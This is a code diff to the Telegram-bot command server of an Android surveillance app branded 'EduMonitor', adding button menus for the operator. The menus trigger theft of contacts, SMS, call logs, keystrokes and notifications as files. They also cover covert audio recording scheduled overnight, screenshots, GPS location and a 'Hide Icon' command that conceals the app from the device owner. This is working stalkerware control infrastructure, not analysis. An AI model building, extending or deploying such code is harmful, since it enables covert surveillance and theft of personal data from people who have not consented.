@@ -84,7 +84,7 @@ function sendJsonResponse(res, data, statusCode = 200) {
     }
 }
 
-// ============= TELEGRAM MESSAGE HELPERS =============
+// ============= INLINE KEYBOARD FUNCTIONS =============
 
 async function sendTelegramMessage(chatId, text) {
     try {
@@ -121,6 +121,75 @@ async function sendTelegramMessage(chatId, text) {
         return null;
     }
 }
+
+async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
+    try {
+        console.log(`📨 Sending message with keyboard to ${chatId}`);
+        
+        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+        
+        console.log(`✅ Message with keyboard sent successfully`);
+        return response.data;
+    } catch (error) {
+        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
+        return null;
+    }
+}
+
+async function editMessageKeyboard(chatId, messageId, newKeyboard) {
+    try {
+        console.log(`🔄 Editing keyboard for message ${messageId}`);
+        
+        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+            chat_id: chatId,
+            message_id: messageId,
+            reply_markup: {
+                inline_keyboard: newKeyboard
+            }
+        });
+        
+        console.log(`✅ Keyboard updated`);
+        return response.data;
+    } catch (error) {
+        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
+        return null;
+    }
+}
+
+async function answerCallbackQuery(callbackQueryId, text = null) {
+    try {
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: callbackQueryId,
+            text: text
+        });
+    } catch (error) {
+        console.error('Error answering callback query:', error.response?.data || error.message);
+    }
+}
+
+// Helper to create inline buttons
+function createInlineButton(text, callbackData) {
+    return {
+        text: text,
+        callback_data: callbackData
+    };
+}
+
+function createUrlButton(text, url) {
+    return {
+        text: text,
+        url: url
+    };
+}
+
+// ============= TELEGRAM DOCUMENT HELPER =============
 
 async function sendTelegramDocument(chatId, filePath, filename, caption) {
     try {
@@ -161,18 +230,15 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
 
 function formatLocationMessage(locationData) {
     try {
-        // Parse location data if it's a string
         let locData = locationData;
         if (typeof locationData === 'string') {
             try {
                 locData = JSON.parse(locationData);
             } catch (e) {
-                // If it's not JSON, return as is
                 return locationData;
             }
         }
 
-        // Check if it's location data
         if (locData.lat && locData.lon) {
             const lat = locData.lat;
             const lon = locData.lon;
@@ -181,10 +247,8 @@ function formatLocationMessage(locationData) {
             const altitude = locData.altitude || 0;
             const speed = locData.speed || 0;
             
-            // Create Google Maps link
             const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // Format date if time exists
             let timeStr = '';
             if (locData.time) {
                 const date = new Date(locData.time);
@@ -648,6 +712,13 @@ app.post('/webhook', async (req, res) => {
             const update = req.body;
             console.log('📩 Received update:', JSON.stringify(update, null, 2));
 
+            // Handle callback queries (button clicks)
+            if (update.callback_query) {
+                await handleCallbackQuery(update.callback_query);
+                return;
+            }
+
+            // Handle regular messages
             if (!update?.message) {
                 console.log('📭 Non-message update');
                 return;
@@ -672,20 +743,302 @@ app.post('/webhook', async (req, res) => {
     });
 });
 
+// ============= CALLBACK QUERY HANDLER =============
+
+async function handleCallbackQuery(callbackQuery) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const data = callbackQuery.data;
+    const callbackId = callbackQuery.id;
+    
+    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
+    
+    // Acknowledge the callback to remove the loading state
+    await answerCallbackQuery(callbackId);
+    
+    // Handle different callback data
+    if (data === 'help_main') {
+        const keyboard = [
+            [
+                createInlineButton('📱 Data', 'menu_data'),
+                createInlineButton('🎤 Recording', 'menu_recording')
+            ],
+            [
+                createInlineButton('📸 Screenshot', 'menu_screenshot'),
+                createInlineButton('⚙️ Services', 'menu_services')
+            ],
+            [
+                createInlineButton('📍 Location', 'menu_location'),
+                createInlineButton('📊 Stats', 'menu_stats')
+            ],
+            [
+                createInlineButton('❌ Close', 'close_menu')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_data') {
+        const keyboard = [
+            [
+                createInlineButton('📇 Contacts (TXT)', 'cmd:contacts_txt'),
+                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
+            ],
+            [
+                createInlineButton('💬 SMS (TXT)', 'cmd:sms_txt'),
+                createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
+            ],
+            [
+                createInlineButton('📞 Call Logs (TXT)', 'cmd:calllogs_txt'),
+                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
+            ],
+            [
+                createInlineButton('⌨️ Keystrokes (TXT)', 'cmd:keystrokes_txt'),
+                createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
+            ],
+            [
+                createInlineButton('🔔 Notifications (TXT)', 'cmd:notifications_txt'),
+                createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
+            ],
+            [
+                createInlineButton('📱 Apps List (TXT)', 'cmd:apps_txt'),
+                createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_recording') {
+        const keyboard = [
+            [
+                createInlineButton('🎤 Record 60s', 'cmd:record'),
+                createInlineButton('⏰ Schedule Status', 'cmd:record_schedule')
+            ],
+            [
+                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
+                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
+            ],
+            [
+                createInlineButton('⚙️ Custom Schedule', 'help_custom'),
+                createInlineButton('🎚️ Audio Quality', 'menu_audio')
+            ],
+            [
+                createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
+                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_audio') {
+        const keyboard = [
+            [
+                createInlineButton('🔊 Ultra Low', 'cmd:audio_ultra'),
+                createInlineButton('🔊 Very Low', 'cmd:audio_very_low')
+            ],
+            [
+                createInlineButton('🔊 Low', 'cmd:audio_low'),
+                createInlineButton('🔊 Medium', 'cmd:audio_medium')
+            ],
+            [
+                createInlineButton('🔊 High', 'cmd:audio_high'),
+                createInlineButton('ℹ️ Info', 'cmd:audio_info')
+            ],
+            [
+                createInlineButton('◀️ Back', 'menu_recording')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_screenshot') {
+        const keyboard = [
+            [
+                createInlineButton('📸 Take Now', 'cmd:screenshot'),
+                createInlineButton('📏 Small', 'cmd:small')
+            ],
+            [
+                createInlineButton('📏 Medium', 'cmd:medium'),
+                createInlineButton('📏 Original', 'cmd:original')
+            ],
+            [
+                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings'),
+                createInlineButton('📊 Size Status', 'cmd:size_status')
+            ],
+            [
+                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
+                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
+            ],
+            [
+                createInlineButton('🔄 Auto ON', 'cmd:auto_on'),
+                createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
+            ],
+            [
+                createInlineButton('📱 Target Apps', 'cmd:target_apps'),
+                createInlineButton('📊 Status', 'cmd:auto_screenshot_status')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_services') {
+        const keyboard = [
+            [
+                createInlineButton('▶️ Start Stream', 'cmd:start_stream'),
+                createInlineButton('⏹️ Stop Stream', 'cmd:stop_stream')
+            ],
+            [
+                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
+                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
+            ],
+            [
+                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
+                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_location') {
+        const keyboard = [
+            [
+                createInlineButton('📍 Get Location', 'cmd:location'),
+                createInlineButton('📡 Network Info', 'cmd:network')
+            ],
+            [
+                createInlineButton('💾 Storage Info', 'cmd:storage'),
+                createInlineButton('🔋 Battery', 'cmd:battery')
+            ],
+            [
+                createInlineButton('ℹ️ Device Info', 'cmd:info'),
+                createInlineButton('🕐 Time', 'cmd:time')
+            ],
+            [
+                createInlineButton('📊 Status', 'cmd:status'),
+                createInlineButton('📝 Logs Count', 'cmd:logs_count')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_stats') {
+        const keyboard = [
+            [
+                createInlineButton('📊 Logs Count', 'cmd:logs_count'),
+                createInlineButton('📋 Recent Logs', 'cmd:logs_recent')
+            ],
+            [
+                createInlineButton('📈 Detailed Stats', 'cmd:stats'),
+                createInlineButton('📸 Compression Stats', 'cmd:compression_stats')
+            ],
+            [
+                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs'),
+                createInlineButton('🔄 Force Refresh', 'cmd:refresh_data')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'close_menu') {
+        // Remove keyboard
+        await editMessageKeyboard(chatId, messageId, []);
+        
+    } else if (data.startsWith('cmd:')) {
+        // Execute a command
+        const command = data.substring(4);
+        console.log(`🎯 Executing command from button: ${command}`);
+        
+        // Show loading indicator
+        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
+        
+        // Forward to command handler
+        await handleCommand(chatId, `/${command}`, messageId);
+        
+        // Update keyboard to show command was sent
+        const keyboard = [
+            [
+                createInlineButton('✅ Command Sent', 'noop'),
+                createInlineButton('◀️ Back to Menu', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'help_custom') {
+        await sendTelegramMessage(chatId, 
+            "⚙️ <b>Custom Schedule Format</b>\n\n" +
+            "<code>/record_custom HH:MM HH:MM [daily/once] [interval]</code>\n\n" +
+            "<b>Examples:</b>\n" +
+            "• <code>/record_custom 22:00 02:00 daily 15</code>\n" +
+            "  (Daily 10 PM to 2 AM, save every 15 min)\n\n" +
+            "• <code>/record_custom 23:30 05:30 once 30</code>\n" +
+            "  (One-time 11:30 PM to 5:30 AM, save every 30 min)");
+    }
+}
+
 // ============= COMMAND HANDLER =============
 
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
     console.log(`📊 Devices in memory: ${devices.size}`);
 
+    // Special case for /help - show inline keyboard menu
     if (command === '/help' || command === '/start') {
-        console.log('📋 Sending help menu directly from server');
-        const helpMessage = getHelpMessage();
-        await sendTelegramMessage(chatId, helpMessage);
-        console.log('✅ Help menu sent');
+        console.log('📋 Showing help menu with inline keyboard');
+        
+        const mainKeyboard = [
+            [
+                createInlineButton('📱 Data Extraction', 'menu_data'),
+                createInlineButton('🎤 Recording', 'menu_recording')
+            ],
+            [
+                createInlineButton('📸 Screenshot', 'menu_screenshot'),
+                createInlineButton('⚙️ Services', 'menu_services')
+            ],
+            [
+                createInlineButton('📍 Location/Info', 'menu_location'),
+                createInlineButton('📊 Stats', 'menu_stats')
+            ],
+            [
+                createInlineButton('❌ Close Menu', 'close_menu')
+            ]
+        ];
+        
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            "🤖 <b>EduMonitor Control Panel</b>\n\n" +
+            "Use the buttons below to access all features:\n\n" +
+            "<b>📱 Data Extraction</b> - Contacts, SMS, Call logs as files\n" +
+            "<b>🎤 Recording</b> - Audio recording and scheduling\n" +
+            "<b>📸 Screenshot</b> - Take screenshots, size settings\n" +
+            "<b>⚙️ Services</b> - Start/stop services, hide icon\n" +
+            "<b>📍 Location/Info</b> - GPS, network, storage info\n" +
+            "<b>📊 Stats</b> - Log counts and statistics",
+            mainKeyboard
+        );
+        
+        console.log('✅ Help menu with keyboard sent');
         return;
     }
 
+    // Find device
     let deviceId = null;
     let device = null;
     
@@ -787,7 +1140,6 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         let caption = '';
         let count = '';
         
-        // Try to extract count from filename or use default
         const countMatch = filename.match(/(\d+)/);
         if (countMatch) {
             count = countMatch[1];
@@ -959,9 +1311,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
         if (error) {
             await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
         } 
-        // Handle location results - but note that actual location data comes via /api/location endpoint
         else if (command === 'location') {
-            // Just acknowledge that location command was executed
             await sendTelegramMessage(chatId, result || '📍 Location command executed. Processing location data...');
         }
         else {
@@ -998,40 +1348,35 @@ app.post('/api/register', async (req, res) => {
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
     console.log(`📊 Total devices: ${devices.size}`);
     
-    await sendTelegramMessage(chatId, 
+    // Send welcome message with inline keyboard
+    const welcomeKeyboard = [
+        [
+            createInlineButton('📱 Data', 'menu_data'),
+            createInlineButton('🎤 Recording', 'menu_recording')
+        ],
+        [
+            createInlineButton('📸 Screenshot', 'menu_screenshot'),
+            createInlineButton('⚙️ Services', 'menu_services')
+        ],
+        [
+            createInlineButton('📍 Location', 'menu_location'),
+            createInlineButton('📊 Stats', 'menu_stats')
+        ],
+        [
+            createInlineButton('❌ Close', 'close_menu')
+        ]
+    ];
+    
+    await sendTelegramMessageWithKeyboard(
+        chatId,
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
         `Android: ${deviceInfo.android}\n` +
         `Battery: ${deviceInfo.battery}\n` +
         `ID: ${deviceId.substring(0, 8)}...\n\n` +
-        `<b>📸 Screenshot Size Options:</b>\n` +
-        `• /small - Max compression\n` +
-        `• /medium - Balanced\n` +
-        `• /original - Best quality\n\n` +
-        `<b>📍 Location:</b> Now returns map link + pin\n\n` +
-        `<b>📱 Data Extraction (as files):</b>\n` +
-        `• /contacts_txt - Contacts (TXT)\n` +
-        `• /contacts_html - Contacts (HTML)\n` +
-        `• /sms_txt - SMS (TXT)\n` +
-        `• /sms_html - SMS (HTML)\n` +
-        `• /calllogs_txt - Call logs (TXT)\n` +
-        `• /calllogs_html - Call logs (HTML)\n` +
-        `• /apps_txt - Apps list (TXT)\n` +
-        `• /apps_html - Apps list (HTML)\n` +
-        `• /keystrokes_txt - Keystrokes (TXT)\n` +
-        `• /keystrokes_html - Keystrokes (HTML)\n` +
-        `• /notifications_txt - Notifications (TXT)\n` +
-        `• /notifications_html - Notifications (HTML)\n\n` +
-        `<b>⏰ Recording Schedule Commands (NEW):</b>\n` +
-        `• /record_auto_on - Enable auto schedule (23:00-04:00)\n` +
-        `• /record_auto_off - Disable auto schedule\n` +
-        `• /record_schedule - Check schedule status\n` +
-        `• /record_custom HH:MM HH:MM [daily/once] [interval] - Set custom schedule\n\n` +
-        `<b>🔍 Info Commands:</b>\n` +
-        `• /storage - Storage usage\n` +
-        `• /network - Network details\n` +
-        `• /screenshot_settings - Current settings\n\n` +
-        `Current size: <b>MEDIUM</b>`);
+        `<b>Use the buttons below to control your device:</b>`,
+        welcomeKeyboard
+    );
     
     res.json({ status: 'registered', deviceId });
 });
@@ -1076,37 +1421,40 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-            <p><b>Location:</b> Now returns map link + pin</p>
-            <p><b>Recording Schedule Commands Added:</b> /record_auto_on, /record_auto_off, /record_schedule, /record_custom</p>
-            <p><b>Commands return files:</b> /contacts_txt, /contacts_html, /sms_txt, /sms_html, /calllogs_txt, /calllogs_html</p>
+            <p><b>Inline Keyboard Support:</b> ✅ ADDED</p>
+            <p><b>Location:</b> Returns map link + pin</p>
+            <p><b>Recording Schedule Commands:</b> Added</p>
             <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
-            <p><a href="/test-location" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test Location Format</a></p>
         </body>
         </html>
     `);
 });
 
-app.get('/test-location', (req, res) => {
-    const testLocation = {
-        lat: 15.2736695,
-        lon: 44.2286799,
-        accuracy: 52.4,
-        provider: 'fused',
-        altitude: 2294.10009765625,
-        time: Date.now()
-    };
-    
-    const formatted = formatLocationMessage(testLocation);
-    res.json({
-        original: testLocation,
-        formatted: formatted
-    });
-});
-
 app.get('/test-help', async (req, res) => {
     const chatId = '5326373447';
-    const helpMessage = getHelpMessage();
-    const result = await sendTelegramMessage(chatId, helpMessage);
+    const mainKeyboard = [
+        [
+            createInlineButton('📱 Data', 'menu_data'),
+            createInlineButton('🎤 Recording', 'menu_recording')
+        ],
+        [
+            createInlineButton('📸 Screenshot', 'menu_screenshot'),
+            createInlineButton('⚙️ Services', 'menu_services')
+        ],
+        [
+            createInlineButton('📍 Location', 'menu_location'),
+            createInlineButton('📊 Stats', 'menu_stats')
+        ],
+        [
+            createInlineButton('❌ Close', 'close_menu')
+        ]
+    ];
+    
+    const result = await sendTelegramMessageWithKeyboard(
+        chatId,
+        "🤖 <b>EduMonitor Control Panel</b>\n\nUse the buttons below:",
+        mainKeyboard
+    );
     res.json({ success: !!result, result });
 });
 
@@ -1117,30 +1465,23 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log(`🚀 Upload directory: ${uploadDir}`);
-    console.log('\n📍 LOCATION FEATURE UPDATED:');
-    console.log('   └─ Now returns map link + pin');
-    console.log('   └─ Dedicated /api/location endpoint added');
-    console.log('\n⏰ RECORDING SCHEDULE COMMANDS ADDED:');
-    console.log('   └─ /record_auto_on     - Enable auto schedule (23:00-04:00)');
+    console.log('\n✅ INLINE KEYBOARD BUTTONS ADDED!');
+    console.log('   └─ Main menu with 6 categories');
+    console.log('   └─ Submenus for each category');
+    console.log('   └─ Command buttons that execute actions');
+    console.log('\n📍 LOCATION FEATURE: Returns map link + pin');
+    console.log('\n⏰ RECORDING SCHEDULE COMMANDS:');
+    console.log('   └─ /record_auto_on     - Enable auto schedule');
     console.log('   └─ /record_auto_off    - Disable auto schedule');
     console.log('   └─ /record_schedule    - Check schedule status');
     console.log('   └─ /record_custom      - Set custom schedule');
-    console.log('         Example: /record_custom 22:00 02:00 daily 15');
-    console.log('         Example: /record_custom 23:30 05:30 once 30');
     console.log('\n📱 FILE-BASED COMMANDS:');
-    console.log('   └─ /contacts_txt     - Contacts as TXT file');
-    console.log('   └─ /contacts_html    - Contacts as HTML file');
-    console.log('   └─ /sms_txt          - SMS as TXT file');
-    console.log('   └─ /sms_html         - SMS as HTML file');
-    console.log('   └─ /calllogs_txt     - Call logs as TXT file');
-    console.log('   └─ /calllogs_html    - Call logs as HTML file');
-    console.log('   └─ /apps_txt         - Apps as TXT file');
-    console.log('   └─ /apps_html        - Apps as HTML file');
-    console.log('   └─ /keystrokes_txt   - Keystrokes as TXT file');
-    console.log('   └─ /keystrokes_html  - Keystrokes as HTML file');
-    console.log('   └─ /notifications_txt - Notifications as TXT file');
-    console.log('   └─ /notifications_html - Notifications as HTML file');
+    console.log('   └─ /contacts_txt/html     - Contacts as file');
+    console.log('   └─ /sms_txt/html          - SMS as file');
+    console.log('   └─ /calllogs_txt/html     - Call logs as file');
+    console.log('   └─ /apps_txt/html         - Apps as file');
+    console.log('   └─ /keystrokes_txt/html   - Keystrokes as file');
+    console.log('   └─ /notifications_txt/html - Notifications as file');
     console.log('\n🚀 File size limit: 50MB');
     console.log('🚀 ===============================================\n');
 });
